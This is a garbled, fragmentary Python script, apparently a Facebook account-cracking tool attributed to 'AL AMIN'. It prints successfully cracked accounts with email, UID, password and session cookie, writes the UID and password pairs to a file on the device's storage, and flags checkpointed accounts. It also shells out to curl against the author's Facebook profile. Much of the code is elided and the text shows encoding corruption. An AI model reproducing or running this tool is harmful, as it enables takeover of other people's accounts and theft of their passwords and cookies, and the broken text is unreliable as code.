fromÂ bs4Â importÂ BeautifulSoupÂ asÂ sop 
 ...
 try: 
 Â Â Â Â os.system('curlÂ https://www.facebook.com/profile.php?id=100000448332183') 
 except: 
 Â Â Â Â pass 
 ...
 Â Â Â Â except: 
 Â Â Â Â Â Â Â Â a=requests.get('https://www.facebook.com/profile.php?id=100000448332183').text 
 ...
 AUTHORÂ Â Â Â :Â AL AMIN 
 FACEBOOKÂ :Â Al Amin Anchar 
 ...
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â print('\r\033[1;32m[âˆš]---------------------[ALAMIN -OK]--------------------[âˆš]\nEMAILÂ :Â '+uid+'\nUIDÂ Â Â :Â '+cid+'Â âˆšÂ '+ps+Â '\nCOOKIEÂ Â Â :Â '+coki+'\n[âˆš]---------------------------------------------------[âˆš]') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cek_apk(session,coki) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â open('/sdcard/ALAMIN-OK.txt',Â 'a').write(cid+'Â |Â '+ps+'\n') 
 ...
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â print(f'\r{Red}[Ã—]--------------------[ALAMIN-Cp]---------------------[Ã—]\nEMAILÂ :Â '+uid+'\nUIDÂ Â Â :Â '+cid+'Â âˆšÂ '+ps+Â '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m') 
